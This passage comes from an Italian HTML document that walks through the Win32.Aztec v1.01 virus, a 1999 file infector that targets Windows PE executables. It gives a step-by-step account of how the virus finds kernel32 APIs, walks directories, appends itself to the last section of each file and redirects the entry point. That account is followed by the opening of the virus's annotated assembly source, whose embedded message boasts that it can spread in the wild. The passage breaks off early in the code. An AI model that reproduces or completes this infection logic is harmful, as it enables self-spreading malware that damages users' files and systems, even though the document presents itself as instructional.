color:#CCFFFF'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>ricava il delta offset;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>ricava l’ImageBase del processo corrente
(host-RAM);<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>call GetK32: ricava gli indirizzi di kernel32;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>call GetAPI: ricava gli indirizzi delle API
utilizzate;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>prepareinfection(): cerca le directory in cui
infettare;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>infectitall(): si reca nella directory;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>7.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>infect(): localizza un file da infettare
(host-disco);<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>8.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>__1: salva l’EIP (vecchio EIP) e l’ImageBase
dell’host-RAM (che verranno modificate durante l’infezione) nello stack;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>9.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>infection(): apre il file da infettare. Ricava la
sua misura in bytes e lo mappa in memoria. Controlla la presena di ‘PE’.
Controlla se è già stato infettato;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>10.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>ricava la somma in bytes dimensioni files + virus. Allinea e
mappa tale somma;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>11.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>sposta il puntatore all’ulstima sezione del file;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>12.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>ricava EIP del file che sta per infettare e lo salva in OLDEIP.
Fa lo stesso con IMAGEBASE (salvato in MODBASE). Ricava SizeOfRawData
dell’ultima sezione del file da infettare e la salva. Aggiunge a SizeOfRawData
il valore di PointerOfRawData e salva tale somma. Riprende SizeOfRawData e a
questa somma l’indirizzo VA (0ch). In questo modo si ottiene il nuovo EIP per
l’HOST. Scrive il nuovo EIP nell’header dell’host-disco e lo salva. In questo
modo ogni volta che si esegue l’host il controllo passa subito al virus
localizzato in appende all’ultima sezione.<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>13.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>modifica l’header con i nuovi valori. Modifica i flag
dell’ultima sezione;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>14.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>inserisce la marcatura di file infettato. Copia il virus
nell’ultima sezione;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>15.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>chiude il file host-disco.<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>16.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>siamo all’ultima infezione (3 directory, 5 files per dir) ? Se
sì, ripesca (dallo stack) il vecchio EIP e la vecchia ImageBase dell’host-RAM
che erano stati salvati nello stack prima di chiamare infection() e vai a 17;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo7;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>17.<span style='font:7.0pt "Times New Roman"'>&nbsp; </span></span><![endif]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'>siamo alla prima generazione ? <o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:71.0pt;text-align:justify;text-indent:
-17.0pt;mso-list:l2 level2 lfo7;tab-stops:list 72.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>sì: fakehost(), messaggio e ritorno a Windows.<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:71.0pt;text-align:justify;text-indent:
-17.0pt;mso-list:l2 level2 lfo7;tab-stops:list 72.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>no: somma il vecchio entry point alla vecchia
ImageBase dell’host-RAM (salvati in 8 e ripristinata in 16) e va ad eseguire
l’host-RAM.<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:54.0pt;text-align:justify'><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;-----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; Virus Name<span style="mso-spacerun:
yes">    </span>: Aztec v1.01<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; Virus Author<span style="mso-spacerun:
yes">  </span>: Billy Belcebu/iKX<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; Origin<span style="mso-spacerun:
yes">            </span>: Spain<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; Platform<span style="mso-spacerun:
yes">         </span>: Win32<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; Target<span style="mso-spacerun:
yes">            </span>: PE files<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; (c) 1999 Billy Belcebu/iKX<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;-----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">   </span>.386p<span style="mso-spacerun:
yes">                                   </span>; 386+ <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">   </span>.model<span style="mso-spacerun: yes"> 
</span>flat<span style="mso-spacerun: yes">                            </span>;
siamo a 32 bit niente segmenti<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">   </span>jumps<span style="mso-spacerun:
yes">                                   </span>; per evitare salti fuori dal
range<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>extrn<span
style="mso-spacerun: yes">   </span>MessageBoxA:PROC<span style="mso-spacerun:
yes">                   </span>; importate per la prima generazione <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>extrn<span style="mso-spacerun: yes">  
</span>ExitProcess:PROC<span style="mso-spacerun: yes">                  
</span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>;
alcune costanti utilizzate dal virus<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>virus_size<span style="mso-spacerun: yes">     
</span>equ<span style="mso-spacerun: yes">     </span>(offset virus_end-offset
virus_start)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>heap_size<span style="mso-spacerun: yes">      
</span>equ<span style="mso-spacerun: yes">     </span>(offset heap_end-offset
heap_start)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>total_size<span style="mso-spacerun: yes">     
</span>equ<span style="mso-spacerun: yes">     </span>virus_size+heap_size<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>shit_size<span style="mso-spacerun: yes">      
</span>equ<span style="mso-spacerun: yes">     </span>(offset delta-offset
aztec)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>; due
indirizzi utilizzati solo per la 1a generazione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>kernel_<span
style="mso-spacerun: yes">         </span>equ<span style="mso-spacerun:
yes">     </span>0BFF70000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>kernel_wNT<span
style="mso-spacerun: yes">      </span>equ<span style="mso-spacerun: yes">    
</span>077F00000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>.data<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>szTitle<span style="mso-spacerun: yes">        
</span>db<span style="mso-spacerun: yes">      </span>&quot;[Win32.Aztec
v1.01]&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>szMessage<span style="mso-spacerun: yes">      
</span>db<span style="mso-spacerun: yes">      </span>&quot;Aztec is a bugfixed
version of my Iced Earth&quot;,10<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">           </span>db<span style="mso-spacerun:
yes">      </span>&quot;virus, with some optimizations and with some&quot;,10<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">               
</span>db<span style="mso-spacerun: yes">      </span>&quot;'special' features
removed. Anyway, it will&quot;,10<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">               
</span>db<span style="mso-spacerun: yes">      </span>&quot;be able to spread
in the wild succefully :)&quot;,10,10<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">               
</span>db<span style="mso-spacerun: yes">      </span>&quot;(c) 1999 by Billy
Belcebu/iKX&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span></span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes"> 
</span>alcune macro, stringhe per il messaggio per la prima generazione, e così
via.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'><span
style="mso-spacerun: yes"> </span>;-----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes">     </span></span><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">   </span>.code<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>virus_start<span
style="mso-spacerun: yes">     </span>label<span style="mso-spacerun: yes">  
</span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>aztec:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pushad<span style="mso-spacerun:
yes">                                  </span>; Pusha tutti i registri (20
bytes)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pushfd<span style="mso-spacerun:
yes">                           </span><span style="mso-spacerun:
yes">       </span>; Pusha i FLAG (4 bytes)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
